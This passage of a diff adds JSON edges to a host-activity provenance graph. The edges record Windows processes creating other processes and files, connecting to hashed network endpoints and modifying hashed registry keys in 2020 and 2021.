+      "last_timestamp": "2020-11-03T15:52:50.032855100Z"
+    },
+    {
+      "source": "Process:{D28789B6-7CD0-5FA1-D800-000000008801}",
+      "target": "File:2abecf8fd969c735",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-03T15:52:49.962139900Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CD0-5FA1-D800-000000008801}",
+      "target": "File:e5b7ffd443d347fc",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-03T15:52:49.942873000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CD0-5FA1-D800-000000008801}",
+      "target": "File:a0c5a52237e37ce0",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-03T15:52:49.909988400Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CD0-5FA1-D800-000000008801}",
+      "target": "Network:07476dc5e129e729",
+      "relation": "CONNECTED_TO",
+      "timestamp": "2020-11-03T15:52:50.953864900Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CCD-5FA1-CF00-000000008801}",
+      "target": "Process:{D28789B6-7CD2-5FA1-DB00-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:52:50.469842300Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CD2-5FA1-DB00-000000008801}",
+      "target": "Network:87ef99e863e763f4",
+      "relation": "CONNECTED_TO",
+      "timestamp": "2020-11-03T15:52:50.469842300Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CCD-5FA1-CF00-000000008801}",
+      "target": "Process:{D28789B6-7CD2-5FA1-DA00-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:52:50.253863100Z",
+      "access_count": 2,
+      "last_timestamp": "2020-11-03T15:52:52.010857900Z"
+    },
+    {
+      "source": "Process:{D28789B6-7CD0-5FA1-D800-000000008801}",
+      "target": "File:667e6d2fa739f204",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-03T15:52:50.008521100Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CD2-5FA1-DB00-000000008801}",
+      "target": "File:c2b507e380917dbf",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-03T15:52:51.194665700Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CCD-5FA1-CF00-000000008801}",
+      "target": "Process:{D28789B6-7CD4-5FA1-DE00-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:52:52.443142900Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CD4-5FA1-DE00-000000008801}",
+      "target": "Network:1c4ac4f38f9f7265",
+      "relation": "CONNECTED_TO",
+      "timestamp": "2020-11-03T15:52:52.443142900Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CCD-5FA1-CF00-000000008801}",
+      "target": "Process:{D28789B6-7CD4-5FA1-DD00-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:52:52.235578400Z",
+      "access_count": 2,
+      "last_timestamp": "2020-11-03T15:52:53.517909700Z"
+    },
+    {
+      "source": "Process:{D28789B6-7CD5-5FA1-E000-000000008801}",
+      "target": "Process:{D28789B6-7CD5-5FA1-E100-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:52:53.865177100Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CD4-5FA1-DE00-000000008801}",
+      "target": "Network:98679ae57d44eb47",
+      "relation": "CONNECTED_TO",
+      "timestamp": "2020-11-03T15:52:53.817592500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CCD-5FA1-CF00-000000008801}",
+      "target": "Process:{D28789B6-7CD5-5FA1-E000-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:52:53.733937600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CD2-5FA1-DB00-000000008801}",
+      "target": "Network:b1e556680ab801e5",
+      "relation": "CONNECTED_TO",
+      "timestamp": "2020-11-03T15:52:53.019546200Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CD2-5FA1-DB00-000000008801}",
+      "target": "Network:98679ae57d44eb47",
+      "relation": "CONNECTED_TO",
+      "timestamp": "2020-11-03T15:52:53.019503600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CD8-5FA1-F200-000000008801}",
+      "target": "Process:{D28789B6-7CCC-5FA1-CB00-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:52:56.420706500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CD8-5FA1-F000-000000008801}",
+      "target": "Process:{D28789B6-7CCC-5FA1-CA00-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:52:56.292856400Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CD8-5FA1-EE00-000000008801}",
+      "target": "Process:{D28789B6-7CCC-5FA1-C900-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:52:56.285672800Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CD8-5FA1-F500-000000008801}",
+      "target": "Process:{D28789B6-7CD9-5FA1-FC00-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:52:57.342576500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7C62-5FA1-0A00-000000008801}",
+      "target": "Registry:3f28a0128d9a65a8",
+      "relation": "MODIFIED_REGISTRY",
+      "timestamp": "2020-11-03T15:52:58.620742400Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7C62-5FA1-0A00-000000008801}",
+      "target": "Registry:3cf31c8b41e2a26a",
+      "relation": "MODIFIED_REGISTRY",
+      "timestamp": "2020-11-03T15:52:58.620396500Z",
+      "access_count": 2,
+      "last_timestamp": "2020-11-03T15:52:59.261600200Z"
+    },
+    {
+      "source": "Process:{D28789B6-7CDB-5FA1-1A01-000000008801}",
+      "target": "Process:{D28789B6-7CDB-5FA1-1D01-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:52:59.440522600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CDB-5FA1-1A01-000000008801}",
+      "target": "File:60dd53c986a25fad",
+      "relation": "CREATED_FILE",
+      "timestamp": "2020-11-03T15:52:59.431434800Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CDB-5FA1-1A01-000000008801}",
+      "target": "Registry:ae74111d403bab25",
+      "relation": "MODIFIED_REGISTRY",
+      "timestamp": "2020-11-03T15:52:59.374634400Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CDB-5FA1-1801-000000008801}",
+      "target": "Process:{D28789B6-7CDB-5FA1-1A01-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:52:59.314493400Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CD9-5FA1-FC00-000000008801}",
+      "target": "Process:{D28789B6-7CDB-5FA1-1801-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:52:59.300564200Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CD9-5FA1-FC00-000000008801}",
+      "target": "Process:{D28789B6-7CDE-5FA1-2101-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:53:02.897089700Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CD9-5FA1-FC00-000000008801}",
+      "target": "Process:{D28789B6-7CDF-5FA1-2801-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:53:03.644616000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CDF-5FA1-2601-000000008801}",
+      "target": "Process:{D28789B6-7CDF-5FA1-2701-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:53:03.136089400Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CD9-5FA1-FC00-000000008801}",
+      "target": "Process:{D28789B6-7CDF-5FA1-2601-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:53:03.129299200Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CDE-5FA1-2101-000000008801}",
+      "target": "Process:{D28789B6-7CDF-5FA1-2501-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:53:03.094381300Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CE0-5FA1-3201-000000008801}",
+      "target": "Process:{D28789B6-7CCC-5FA1-CB00-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:53:04.630035000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CE0-5FA1-3101-000000008801}",
+      "target": "Process:{D28789B6-7CCC-5FA1-CA00-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:53:04.500238700Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CE0-5FA1-2F01-000000008801}",
+      "target": "Process:{D28789B6-7CCC-5FA1-C900-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:53:04.495022900Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CE0-5FA1-3501-000000008801}",
+      "target": "Process:{D28789B6-7CE1-5FA1-4001-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:53:05.559981000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CE1-5FA1-4001-000000008801}",
+      "target": "Process:{D28789B6-7CE2-5FA1-5201-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:53:06.835907500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CE1-5FA1-4001-000000008801}",
+      "target": "Process:{D28789B6-7CE2-5FA1-5001-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:53:06.803155900Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7C62-5FA1-0A00-000000008801}",
+      "target": "Registry:80e3c3ba984a7193",
+      "relation": "MODIFIED_REGISTRY",
+      "timestamp": "2020-11-03T15:53:10.315923400Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7C62-5FA1-0A00-000000008801}",
+      "target": "Registry:e77c86c0aea284c5",
+      "relation": "MODIFIED_REGISTRY",
+      "timestamp": "2020-11-03T15:53:10.315573400Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{29E67E80-859E-6019-7005-00000000A301}",
+      "target": "Process:{D28789B6-7CE2-5FA1-5001-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2021-02-03T16:49:54.623564100Z",
+      "access_count": 2,
+      "last_timestamp": "2021-02-03T16:51:08.200382700Z"
+    },
+    {
+      "source": "Process:{29E67E80-D475-601A-4830-00000000A301}",
+      "target": "Process:{D28789B6-7CDB-5FA1-1D01-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2021-02-03T16:51:01.814122800Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{29E67E80-D475-601A-4830-00000000A301}",
+      "target": "File:60dd53c986a25fad",
+      "relation": "CREATED_FILE",
+      "timestamp": "2021-02-03T16:51:01.804885600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{29E67E80-D475-601A-4830-00000000A301}",
+      "target": "Registry:82f77e03b92b1422",
+      "relation": "MODIFIED_REGISTRY",
+      "timestamp": "2021-02-03T16:51:01.799533600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{29E67E80-D475-601A-4730-00000000A301}",
+      "target": "Process:{D28789B6-7CDB-5FA1-1A01-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2021-02-03T16:51:01.784986200Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{29E67E80-859E-6019-7005-00000000A301}",
+      "target": "Process:{D28789B6-7CDB-5FA1-1801-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2021-02-03T16:51:01.777228200Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{29E67E80-D482-601A-4D30-00000000A301}",
+      "target": "Process:{29E67E80-D482-601A-4E30-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-02-03T16:51:14.671963800Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{29E67E80-D482-601A-4D30-00000000A301}",
+      "target": "File:fea588adb655ae6d",
+      "relation": "CREATED_FILE",
+      "timestamp": "2021-02-03T16:51:14.662450600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{29E67E80-D482-601A-4D30-00000000A301}",
+      "target": "Registry:82f77e03b92b1422",
+      "relation": "MODIFIED_REGISTRY",
+      "timestamp": "2021-02-03T16:51:14.657001100Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{29E67E80-859E-6019-7005-00000000A301}",
+      "target": "Process:{29E67E80-D482-601A-4D30-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-02-03T16:51:14.642903600Z",
+      "access_count": 1
+    }
+  ]
 }
